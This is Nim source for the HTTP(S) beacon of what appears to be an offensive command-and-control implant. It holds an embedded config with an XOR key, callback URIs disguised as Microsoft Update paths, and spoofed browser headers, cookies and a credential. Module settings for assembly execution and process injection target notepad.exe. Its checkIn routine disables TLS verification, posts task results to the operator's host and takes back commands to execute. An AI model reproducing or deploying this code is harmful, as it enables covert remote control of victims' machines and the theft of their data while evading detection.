import std/net
import httpclient
import json
import uri
import std/strutils
import std/base64
import std/tables
import std/random

import Beacon


const configJson = r"""
{
    "DomainName": "",
    "ExposedIp": "",
    "xorKey": "dfsdgferhzdzxczevre5595485sdg",
    "ListenerHttpConfig": {
        "uri": [
            "/MicrosoftUpdate/ShellEx/KB242742/default.aspx",
            "/MicrosoftUpdate/ShellEx/KB242742/admin.aspx",
            "/MicrosoftUpdate/ShellEx/KB242742/download.aspx"
        ],
        "client": {
            "headers": {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
                "Connection": "Keep-Alive",
                "Content-Type": "text/plain;charset=UTF-8",
                "Content-Language": "fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7",
                "Authorization": "YWRtaW46c2RGSGVmODQvZkg3QWMtIQ==",
                "Keep-Alive": "timeout=5, max=1000",
                "Cookie": "PHPSESSID=298zf09hf012fh2; csrftoken=u32t4o3tb3gg43; _gat=1",
                "Accept": "*/*",
                "Sec-Ch-Ua": "\"Not.A/Brand\";v=\"8\", \"Chromium\";v=\"114\", \"Google Chrome\";v=\"114\"",
                "Sec-Ch-Ua-Platform": "Windows"
            }
        }
    },
    "ListenerHttpsConfig": {
        "uri": [
            "/MicrosoftUpdate/ShellEx/KB242742/default.aspx",
            "/MicrosoftUpdate/ShellEx/KB242742/upload.aspx",
            "/MicrosoftUpdate/ShellEx/KB242742/config.aspx"
        ],
        "client": {
            "headers": {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
                "Connection": "Keep-Alive",
                "Content-Type": "text/plain;charset=UTF-8",
                "Content-Language": "fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7",
                "Authorization": "YWRtaW46c2RGSGVmODQvZkg3QWMtIQ==",
                "Keep-Alive": "timeout=5, max=1000",
                "Cookie": "PHPSESSID=298zf09hf012fh2; csrftoken=u32t4o3tb3gg43; _gat=1",
                "Accept": "*/*",
                "Sec-Ch-Ua": "\"Not.A/Brand\";v=\"8\", \"Chromium\";v=\"114\", \"Google Chrome\";v=\"114\"",
                "Sec-Ch-Ua-Platform": "Windows"
            }
        }
    },
    "ModulesConfig": {
        "assemblyExec": {
            "process": "notepad.exe",
            "test": "test"
        },
        "inject": {
            "process": "notepad.exe",
            "test": "test"
        },
        "toto": {
            "process": "test",
            "test": "test"
        }
    }
}
"""

proc loadConfigFromConst(): JsonNode =
  result = parseJson(configJson)


type
  BeaconHttp* = ref object of Beacon
    host: string
    port: string
    scheme: string
    endpoints: seq[string]
    headers: Table[string, string]
    isHttps: bool
    configPath: string


proc loadConfig(self: BeaconHttp) =
  let configJson = loadConfigFromConst()

  if configJson.hasKey("xorKey"):
    self.xorKey = configJson["xorKey"].getStr()

  let listenerKey = if self.isHttps: "ListenerHttpsConfig" else: "ListenerHttpConfig"
  if not configJson.hasKey(listenerKey):
    return

  let listenerConfig = configJson[listenerKey]

  if listenerConfig.hasKey("uri"):
    let uriNode = listenerConfig["uri"]
    if uriNode.kind == JArray:
      self.endpoints.setLen(0)
      for value in uriNode:
        if value.kind == JString:
          self.endpoints.add(value.getStr())

  if listenerConfig.hasKey("client"):
    let clientNode = listenerConfig["client"]
    if clientNode.kind == JObject and clientNode.hasKey("headers"):
      let headerNode = clientNode["headers"]
      if headerNode.kind == JObject:
        for k, v in headerNode.pairs:
          if v.kind == JString:
            self.headers[k] = v.getStr()


proc initBeaconHttp*(self: BeaconHttp, baseUrl, port: string) =
  self.initBeacon()
  self.port = port

  let parsed = parseUri(baseUrl)
  var scheme = parsed.scheme
  if scheme.len == 0:
    scheme = "http"
  self.scheme = scheme.toLowerAscii()
  self.isHttps = self.scheme == "https"
  self.host = parsed.hostname
  if self.host.len == 0:
    self.host = baseUrl

  self.endpoints = @[]
  self.headers = initTable[string, string]()

  self.loadConfig()

  if self.endpoints.len == 0:
    self.endpoints = @[parsed.path]
  if self.endpoints.len == 0:
    self.endpoints = @["/"]


proc checkIn*(self: BeaconHttp) =
  let client = newHttpClient(sslContext = newContext(verifyMode = CVerifyNone))

  try:
    var clientHeaders = newHttpHeaders()
    var hasHeaders = false
    for k, v in self.headers.pairs:
      clientHeaders[k] = v
      hasHeaders = true
    if not self.headers.hasKey("Content-Type"):
      clientHeaders["Content-Type"] = "text/plain;charset=UTF-8"
      hasHeaders = true
    if hasHeaders:
      client.headers = clientHeaders

    let payload = self.taskResultsToCmd()

    var endpoint = self.endpoints[rand(self.endpoints.high)]
    if endpoint.len == 0:
      endpoint = "/"
    elif endpoint[0] != '/':
      endpoint = "/" & endpoint

    let fullUrl = self.scheme & "://" & self.host & ":" & self.port & endpoint

    let response = client.request(fullUrl, httpMethod = HttpPost, body = payload)

    if response.code == Http200 and response.body.len > 0:
      self.cmdToTasks(response.body)

  except:
    let
      e = getCurrentException()
      msg = getCurrentExceptionMsg()
    echo "Inside checkIn, got exception ", repr(e), " with message ", msg

  finally:
    close(client)


proc runTasks*(self: BeaconHttp) =
    self.execInstruction()
